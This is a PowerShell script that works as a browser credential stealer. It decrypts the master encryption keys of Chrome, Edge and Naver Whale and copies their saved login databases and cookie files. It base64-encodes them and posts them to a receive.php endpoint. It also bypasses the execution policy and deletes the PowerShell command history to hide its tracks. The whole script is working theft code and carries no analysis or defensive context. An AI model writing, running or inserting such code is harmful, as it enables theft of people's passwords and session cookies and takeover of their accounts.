[Net.ServicePointManager]::SecurityProtocol +='tls12'

$srsdf='http://localhost/receive.php'
function GetFile() {
	param (
        $mytar,
	    $name, 
		$folder
       )
	Write-Output $name
	$dhd=[IO.File]::readallbytes($mytar);
	$kfjh=[System.Convert]::ToBase64String($dhd);
	$kfjh=[regex]::Replace($kfjh,'=','%');
	$msgin='access='+$kfjh+'&name='+$name+'&folder='+$folder;
	Invoke-WebRequest -Uri $srsdf -Method Post -Body $msgin;
}

function CopyFile ($Array)
{
	if (!(Test-Path -Path $Array[0])) {return $False}

	$Files = Get-ChildItem -File -Path $Array[0] -Recurse -Include "Login Data"
	if($Files)
	{
		for ($i = 0; $i -lt $Files.Count; $i++)
		{
            $fileName = "LoginData_" + $Array[1] + $i
			$destFileName = $env:APPDATA + "/" + $fileName
			Copy-Item $Files[$i] -Destination $destFileName -Force
            GetFile $destFileName $fileName $Array[2]
			del $destFileName
			Write-Output $destFileName
		}
	}

	$Files = Get-ChildItem -File -Path $Array[0] -Recurse -Include "Login Data For Account"
	if($Files)
	{
		for ($i = 0; $i -lt $Files.Count; $i++)
		{
            $fileName = "LoginForAccount_" + $Array[1] + $i
			$destFileName = $env:APPDATA + "/" + $fileName
			Copy-Item -Path $Files[$i].FullName -Destination $destFileName -Force
            GetFile $destFileName $fileName $Array[2]
			Write-Output $destFileName
			del $destFileName
		}
	}
}

function CookieCopyFile ($Array)
{
	if (!(Test-Path -Path $Array[0])) {return $False}

	$Files = Get-ChildItem -File -Path $Array[0] -Recurse -Include "Cookies"
	if($Files)
	{
		for ($i = 0; $i -lt $Files.Count; $i++)
		{
            $fileName = "Cookies_" + $Array[1] + $i
			$destFileName = $env:APPDATA + "/" + $fileName
			Copy-Item $Files[$i] -Destination $destFileName -Force
            GetFile $destFileName $fileName $Array[2]
			Write-Output $destFileName
            del $destFileName
		}
	}
}

function Get-MasterKey ($Path)
{
	if (!(Test-Path -Path $Path)) {return $False}
	$FileLocalState = Get-ChildItem -File $Path -Recurse -Include "Local State"

	$localStatePath = $FileLocalState.FullName
	$localStateData = [IO.File]::ReadAllText($localStatePath)


	$keyBase64=[regex]::Match($localStateData,'(?<="encrypted_key":")(.*?)(?=")').value;
	
	$outFile_masterkey = "$env:APPDATA\masterkey.txt"
    Add-Content -Path $outFile_masterkey -Value ("--------------------------------------")
	Add-Content -Path $outFile_masterkey -Value ("keybase : " + $keyBase64)

	$keyBytes = [System.Convert]::FromBase64String($keyBase64)
	$keyBytes = $keyBytes[5..($keyBytes.length-1)]  # Remove 'DPAPI' from start
	$masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($keyBytes, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)

	return [System.Convert]::ToBase64String($masterKey)
}

function Get-MasterKeyJSON ($Path)
{
	if (!(Test-Path -Path $Path)) {return $False}
	$FileLocalState = Get-ChildItem -File $Path -Recurse -Include "Local State"

	$localStatePath = $FileLocalState.FullName
	$localStateData = [IO.File]::ReadAllText($localStatePath)

	$keyBase64 = (ConvertFrom-Json $localStateData).os_crypt.encrypted_key

	$outFile_masterkey = "$env:APPDATA\masterkey.txt"
	Add-Content -Path $outFile_masterkey -Value ("--------------------------------------")
	Add-Content -Path $outFile_masterkey -Value ("keybase : " + $keyBase64)

	$keyBytes = [System.Convert]::FromBase64String($keyBase64)
	$keyBytes = $keyBytes[5..($keyBytes.length-1)]  # Remove 'DPAPI' from start
	$masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($keyBytes, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)

	return [System.Convert]::ToBase64String($masterKey)
}

function main
{
	Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force

	$ChromedataPath = "$($env:LOCALAPPDATA)\\Google\\Chrome\\User Data"
	$EdgedataPath = "$($env:LOCALAPPDATA)\\Microsoft\\Edge\\User Data"
	$NaverWhaledataPath = "$($env:LOCALAPPDATA)\\Naver\\Naver Whale\\User Data"

	Add-Type -AssemblyName System.Security
    
	$outFile_masterkey = "$env:APPDATA\masterkey.txt"
	$masterkey = Get-MasterKey ($ChromedataPath)
	Add-Content -Path $outFile_masterkey -Value ("Chrome1 : " + $masterkey)

	$masterkey = Get-MasterKeyJSON ($ChromedataPath)
	Add-Content -Path $outFile_masterkey -Value ("Chrome2 : " + $masterkey)
    
    $masterkey = Get-MasterKey ($EdgedataPath)
	Add-Content -Path $outFile_masterkey -Value ("msedge : " + $masterkey)

	$masterkey = Get-MasterKeyJSON ($EdgedataPath)
	Add-Content -Path $outFile_masterkey -Value ("msedge : " + $masterkey)

	$masterkey = Get-MasterKey ($NaverWhaledataPath)
	Add-Content -Path $outFile_masterkey -Value ("NaverWhale : " + $masterkey)

	$masterkey = Get-MasterKeyJSON ($NaverWhaledataPath)
	Add-Content -Path $outFile_masterkey -Value ("NaverWhale : " + $masterkey)

    $utcDateTime = Get-Date -UFormat "%s"  
    $utcDateTime = [System.DateTime]::UtcNow
    $folderName = $utcDateTime.ToString("yyyy-MM-dd_HH-mm-ss-") + "session"
    Write-Output $folderName
    GetFile $outFile_masterkey "masterkey" $folderName 
    del $outFile_masterkey

	CopyFile (@($ChromedataPath,"Chrome",$folderName))
	CopyFile (@($EdgedataPath,"msedge",$folderName))

	CookieCopyFile (@($ChromedataPath,"Chrome",$folderName))
	CookieCopyFile (@($EdgedataPath,"msedge",$folderName))
	
	$logp = $env:appdata + "\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
	del $logp
}

main